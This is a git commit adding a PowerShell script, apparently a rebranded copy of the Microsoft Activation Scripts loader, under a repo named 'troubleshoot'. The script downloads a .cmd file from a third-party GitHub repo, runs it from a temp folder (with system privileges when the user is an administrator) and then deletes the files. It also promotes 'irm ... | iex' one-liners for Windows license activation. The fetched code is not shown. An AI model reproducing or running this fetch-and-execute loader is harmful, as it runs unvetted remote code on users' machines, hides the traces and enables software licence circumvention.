611a8d0922da6af14359e5daadfc3e9df1b40be8
StrawberryID <130676307+digital-storeid@users.noreply.github.com>
2024-07-31 00:38:05 +0700

    Add files via upload

---
+++ set0.ps1
@@ -0,0 +1,41 @@
+# digital.storeid
+
+$ErrorActionPreference = "Stop"
+
+write-host
+Write-Host "The current command (irm https://massgrave.dev/get | iex) will be retired on Aug 31, 2024."
+Write-Host -ForegroundColor Green "Use the new command (irm https://get.activated.win | iex) moving forward."
+write-host
+
+# Enable TLSv1.2 for compatibility with older clients for current session
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+
+$DownloadURL1 = 'https://raw.githubusercontent.com/digital-storeid/troubleshoot/main/set0.cmd'
+$DownloadURL2 = 'https://raw.githubusercontent.com/digital-storeid/troubleshoot/main/set0.cmd'
+
+$URLs = @($DownloadURL1, $DownloadURL2)
+$RandomURL1 = Get-Random -InputObject $URLs
+$RandomURL2 = $URLs -ne $RandomURL1
+
+try {
+    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
+}
+catch {
+	$response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
+}
+
+$rand = [Guid]::NewGuid().Guid
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
+
+$ScriptArgs = "$args "
+$prefix = "@::: $rand `r`n"
+$content = $prefix + $response
+Set-Content -Path $FilePath -Value $content
+
+# Set ComSpec variable for current session in case its corrupt in the system
+$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
+Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
+
+$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
